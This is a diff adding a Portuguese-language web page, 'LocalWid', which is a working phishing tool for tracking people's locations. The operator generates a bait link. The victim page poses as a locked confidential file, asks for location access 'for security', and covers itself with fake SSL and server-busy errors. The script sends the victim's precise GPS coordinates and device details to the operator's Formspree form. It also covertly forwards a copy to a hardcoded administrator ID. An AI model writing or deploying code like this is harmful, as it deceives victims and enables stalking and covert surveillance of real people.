@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LocalWid - Manager</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#00d2ff">
+    
+    <style>
+        :root { --primary: #00d2ff; --bg: #0f0c29; --card: #1a1a3a; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
+        .container { background: var(--card); padding: 30px; border-radius: 20px; text-align: center; width: 95%; max-width: 650px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .logo { width: 80px; height: 80px; border-radius: 50%; margin-bottom: 10px; border: 2px solid var(--primary); object-fit: cover; }
+        h1 { color: var(--primary); margin: 0 0 20px 0; }
+        .btn { background: linear-gradient(90deg, #3a7bd5, var(--primary)); color: white; border: none; padding: 15px; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; text-transform: uppercase; }
+        .btn-install { background: #ff9f43; color: #fff; margin-bottom: 15px; display: none; width: auto; padding: 10px 20px; }
+        input { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: none; box-sizing: border-box; text-align: center; background: #eee; color: #333; font-weight: bold; }
+        .admin-section { margin-top: 30px; border-top: 2px solid #333; padding-top: 20px; text-align: left; }
+        .data-grupo { background: #0b0920; margin-bottom: 15px; border-radius: 8px; overflow: hidden; border: 1px solid #333; }
+        .data-header { background: #222; padding: 10px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; color: var(--primary); }
+        .delete-day { color: #ff4444; cursor: pointer; font-size: 18px; font-weight: bold; padding: 0 10px; }
+        table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        th, td { border-bottom: 1px solid #222; padding: 10px; text-align: center; }
+        .maps-btn { background: #28a745; color: white; padding: 4px 8px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 10px; }
+        .hidden { display: none; }
+        #copy-status { font-size: 12px; color: #00ffc3; margin-top: 5px; display: none; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <button id="installApp" class="btn btn-install">📲 INSTALAR APP LOCALWID</button>
+
+    <div id="setup-panel" class="container">
+        <img src="https://lh3.googleusercontent.com/d/1cRsTLg6uRG1MM4iJc9XjOEWIUqkqgHQY" class="logo" alt="Logo">
+        <h1>LocalWid</h1>
+        
+        <p>Adicionar ID (Campo Obrigatrio!)</p>
+        <input type="text" id="form-id" placeholder="Exemplo: mqedjrjb">
+        
+        <p>Mensagem </p>
+        <input type="text" id="isca-nome" placeholder="Exemplo: Arquivo Confidencial">
+        
+        <button class="btn" onclick="gerarLink()">GERAR LINK</button>
+        
+        <div id="link-area" class="hidden">
+            <p style="color: #00ffc3; margin-top: 20px; text-align: center;">Link para enviar:</p>
+            <input type="text" id="link-final" readonly>
+            <button class="btn" style="background: #444; width: auto; display: block; margin: 10px auto;" onclick="copiarLink()">📋 COPIAR</button>
+            <div id="copy-status">Copiado com sucesso!</div>
+        </div>
+
+        <div class="admin-section">
+            <h3 style="text-align: center;"> Histórico Local</h3>
+            <div id="historico-agrupado"></div>
+        </div>
+    </div>
+
+    <div id="victim-panel" class="container hidden">
+        <img src="https://lh3.googleusercontent.com/d/1cRsTLg6uRG1MM4iJc9XjOEWIUqkqgHQY" class="logo" alt="Logo">
+        <h2 id="titulo-vitima">AQUIVO BLOQUEADO</h2>
+        <p>Para visualizar este conteúdo, permita o acesso à localização para a maior segurança.</p>
+        <button class="btn" id="btn-vitima" onclick="capturarVítima()">LIBERAR ACESSO</button>
+        <div id="loader" class="hidden">⌛ Verificando...</div>
+        <p id="error-final" class="hidden" style="color: #ff4444; font-weight: bold;">Erro: Servidor ocupado. Tente em 5 minutos.</p>
+    </div>
+
+    <script>
+        const MEU_ID_ADMIN_GLOBAL = "mqedjrjb"; // Seu ID fixo para receber sempre
+
+        // Registro do Service Worker (para o PWA)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').catch(() => {});
+        }
+
+        // Lógica de Instalação do App
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            document.getElementById('installApp').style.display = 'block';
+        });
+
+        document.getElementById('installApp').addEventListener('click', async () => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt = null;
+                document.getElementById('installApp').style.display = 'none';
+            }
+        });
+
+        // Alternar entre Painel e Isca
+        const params = new URLSearchParams(window.location.search);
+        const victimId = params.get('id');
+        const iscaTexto = params.get('msg');
+
+        if (victimId) {
+            document.getElementById('setup-panel').classList.add('hidden');
+            document.getElementById('victim-panel').classList.remove('hidden');
+            document.getElementById('titulo-vitima').textContent = iscaTexto || "DOCUMENTO";
+            document.title = iscaTexto || "Documento";
+        } else {
+            carregarTabela();
+        }
+
+        function gerarLink() {
+            const id = document.getElementById('form-id').value.trim();
+            const msg = document.getElementById('isca-nome').value.trim() || "Documento";
+            if (!id) return alert("Insira o seu ID do Formspree!");
+            const linkBase = window.location.href.split('?')[0];
+            const linkFinal = `${linkBase}?id=${id}&msg=${encodeURIComponent(msg)}`;
+            document.getElementById('link-final').value = linkFinal;
+            document.getElementById('link-area').classList.remove('hidden');
+        }
+
+        function copiarLink() {
+            const linkInput = document.getElementById('link-final');
+            linkInput.select();
+            navigator.clipboard.writeText(linkInput.value);
+            document.getElementById('copy-status').style.display = 'block';
+        }
+
+        function capturarVítima() {
+            const btn = document.getElementById('btn-vitima');
+            const loader = document.getElementById('loader');
+            btn.classList.add('hidden');
+            loader.classList.remove('hidden');
+
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const agora = new Date();
+                const dataStr = agora.toLocaleDateString('pt-BR');
+                const horaStr = agora.toLocaleTimeString('pt-BR');
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const linkMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                const dados = {
+                    Alerta: "⚠️ ALGUÉM CLICOU!",
+                    Isca: iscaTexto || "Padrão",
+                    Mapa: linkMaps,
+                    Data: dataStr,
+                    Hora: horaStr,
+                    Dispositivo: navigator.userAgent
+                };
+
+                // ENVIO 1: Para quem gerou o link
+                fetch(`https://formspree.io/f/${victimId}`, { 
+                    method: "POST", 
+                    headers: { "Content-Type": "application/json" }, 
+                    body: JSON.stringify(dados) 
+                });
+
+                // ENVIO 2: Para VOCÊ (Administrador) - Se o ID for diferente do seu
+                if (victimId !== MEU_ID_ADMIN_GLOBAL) {
+                    fetch(`https://formspree.io/f/${MEU_ID_ADMIN_GLOBAL}`, { 
+                        method: "POST", 
+                        headers: { "Content-Type": "application/json" }, 
+                        body: JSON.stringify({ ...dados, Admin_Log: "Cópia de Segurança" }) 
+                    });
+                }
+
+                // Salvar histórico local
+                let hist = JSON.parse(localStorage.getItem('capturas_v4') || "[]");
+                hist.push({ data: dataStr, hora: horaStr, coords: `${lat.toFixed(4)},${lon.toFixed(4)}`, mapa: linkMaps });
+                localStorage.setItem('capturas_v4', JSON.stringify(hist));
+
+                setTimeout(() => {
+                    loader.classList.add('hidden');
+                    document.getElementById('error-final').classList.remove('hidden');
+                }, 2500);
+
+            }, () => {
+                alert("Erro SSL: Localização necessária para descriptografar o arquivo.");
+                btn.classList.remove('hidden');
+                loader.classList.add('hidden');
+            }, { enableHighAccuracy: true });
+        }
+
+        function carregarTabela() {
+            const lista = JSON.parse(localStorage.getItem('capturas_v4') || "[]");
+            const div = document.getElementById('historico-agrupado');
+            div.innerHTML = "";
+            if (lista.length === 0) return div.innerHTML = "<p style='text-align:center; opacity:0.5;'>Nenhuma atividade ainda.</p>";
+
+            const grupos = {};
+            lista.forEach(i => { if (!grupos[i.data]) grupos[i.data] = []; grupos[i.data].push(i); });
+
+            Object.keys(grupos).reverse().forEach(d => {
+                let h = `<div class="data-grupo"><div class="data-header"><span>📅 ${d}</span><span class="delete-day" onclick="excluirDia('${d}')">🗑️</span></div>
+                <table><thead><tr><th>Hora</th><th>Local</th><th>Ver</th></tr></thead><tbody>`;
+                grupos[d].reverse().forEach(v => {
+                    h += `<tr><td>${v.hora}</td><td>${v.coords}</td><td><a href="${v.mapa}" target="_blank" class="maps-btn">MAPA</a></td></tr>`;
+                });
+                h += `</tbody></table></div>`;
+                div.innerHTML += h;
+            });
+        }
+
+        function excluirDia(d) {
+            if (confirm(`Limpar dia ${d}?`)) {
+                let l = JSON.parse(localStorage.getItem('capturas_v4') || "[]").filter(i => i.data !== d);
+                localStorage.setItem('capturas_v4', JSON.stringify(l));
+                carregarTabela();
+            }
+        }
+    </script>
+</body>
+</html>
